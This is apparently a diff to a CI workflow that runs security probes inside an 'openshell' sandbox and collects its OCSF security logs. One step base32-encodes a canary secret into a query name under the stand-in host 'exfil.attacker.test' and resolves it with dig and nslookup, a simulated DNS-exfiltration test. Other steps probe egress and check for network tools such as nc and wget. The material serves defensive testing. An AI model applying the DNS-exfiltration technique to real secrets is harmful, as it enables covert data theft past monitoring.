@@ -154,6 +154,8 @@ jobs:
           export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
           if [ -f "$OSLIVE/stage/gateway.ok" ]; then
             openshell settings set --global --key ocsf_json_enabled --value true 2>&1 | tee "$OSLIVE/ocsf-setting.txt" || true
+            echo "waiting 25s for the settings poll cycle to reach supervisors ..."
+            sleep 25
           else
             echo "gateway not connected; skipped" | tee "$OSLIVE/ocsf-setting.txt"
           fi
@@ -192,28 +194,27 @@ jobs:
           EXFIL="$(python3 -c "import base64;print(base64.b32encode(b'CANARY-SECRET-7f3a9d2e').decode().rstrip('=').lower())").exfil.attacker.test"
           echo "$EXFIL" > "$OSLIVE/exfil-qname.txt"
           echo "exfil qname: $EXFIL"
+          echo "waiting for the ocsf_json_enabled settings poll cycle ..."; sleep 15
           run_exec() {
             name="$1"; shift
             echo "### $name :: $*" | tee "$OSLIVE/exec/$name.txt"
-            timeout 90 openshell sandbox exec oslive -- "$@" >> "$OSLIVE/exec/$name.txt" 2>&1
-            echo "exit=$?" >> "$OSLIVE/exec/$name.txt"
+            rc=0
+            timeout 90 openshell sandbox exec oslive -- "$@" >> "$OSLIVE/exec/$name.txt" 2>&1 || rc=$?
+            echo "exit=$rc" >> "$OSLIVE/exec/$name.txt"
             cat "$OSLIVE/exec/$name.txt"
+            return 0
           }
+          run_exec 00-tools sh -c 'command -v dig nslookup getent curl python3 python nc wget; true'
           run_exec 01-identity id
-          run_exec 02-python python3 --version
-          run_exec 03-file sh -c 'echo seatbelt-live-probe > /tmp/probe.txt && cat /tmp/probe.txt'
-          run_exec 04-dns-public getent hosts api.github.com
-          run_exec 05-dns-public-dig dig +time=5 +tries=1 api.github.com
-          run_exec 06-dns-exfil python3 -c "import socket,sys
-          try:
-              print(socket.getaddrinfo('$EXFIL', 443))
-          except Exception as e:
-              print('EXFIL-DNS-ERROR', type(e).__name__, e)"
-          run_exec 07-dns-exfil-dig dig +time=5 +tries=1 "$EXFIL"
-          run_exec 08-dns-ext-1111 dig +time=5 +tries=1 @1.1.1.1 example.com
-          run_exec 09-dns-ext-8888 dig +time=5 +tries=1 @8.8.8.8 example.com
-          run_exec 10-egress-github curl -m 15 -sS -o /dev/null -w 'http_code=%{http_code}\n' https://api.github.com/zen
-          run_exec 11-egress-example curl -m 15 -sS -o /dev/null -w 'http_code=%{http_code}\n' http://example.com/
+          run_exec 02-file sh -c 'echo seatbelt-live-probe > /tmp/probe.txt && cat /tmp/probe.txt'
+          run_exec 03-dns-public getent hosts api.github.com
+          run_exec 04-dns-public-dig dig +time=5 +tries=1 api.github.com
+          run_exec 05-dns-exfil-dig dig +time=5 +tries=1 "$EXFIL"
+          run_exec 06-dns-exfil-nslookup nslookup "$EXFIL"
+          run_exec 07-dns-ext-1111 dig +time=5 +tries=1 @1.1.1.1 example.com
+          run_exec 08-dns-ext-8888 dig +time=5 +tries=1 @8.8.8.8 example.com
+          run_exec 09-egress-github curl -m 15 -sS -o /dev/null -w 'http_code=%{http_code}\n' https://api.github.com/zen
+          run_exec 10-egress-example curl -m 15 -sS -o /dev/null -w 'http_code=%{http_code}\n' http://example.com/
           echo "letting logs flush ..."; sleep 20
 
       - name: Capture native OCSF (supervisor stderr + openshell logs)
@@ -223,12 +224,15 @@ jobs:
           export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
           docker ps -a --format '{{.ID}} {{.Names}} {{.Image}} {{.Status}}' | tee "$OSLIVE/docker-ps-all.txt" || true
           mkdir -p "$OSLIVE/container-logs"
-          for cid in $(docker ps -a --format '{{.ID}} {{.Names}}' | grep -iE 'openshell|oslive|supervisor|sandbox' | awk '{print $1}'); do
+          for cid in $(docker ps -a --format '{{.ID}}'); do
             cname="$(docker inspect --format '{{.Name}}' "$cid" 2>/dev/null | tr -d '/' || echo "$cid")"
             echo "dumping logs for $cid ($cname)"
             docker logs "$cid" > "$OSLIVE/container-logs/$cname.log" 2>&1 || true
             docker exec "$cid" ls -la /var/log >> "$OSLIVE/container-logs/$cname.log" 2>&1 || true
           done
+          echo "== shorthand OCSF lines in container logs =="
+          grep -hc 'OCSF ' "$OSLIVE"/container-logs/*.log 2>/dev/null || true
+          grep -h 'OCSF ' "$OSLIVE"/container-logs/*.log 2>/dev/null | head -30 || true
           # Extract full OCSF JSON records from supervisor stderr markers.
           grep -h 'OCSF-JSON ' "$OSLIVE"/container-logs/*.log 2>/dev/null | sed 's/.*OCSF-JSON //' > "$OSLIVE/native-ocsf-raw.ndjson" || true
           python3 - "$OSLIVE" <<'PYEOF'
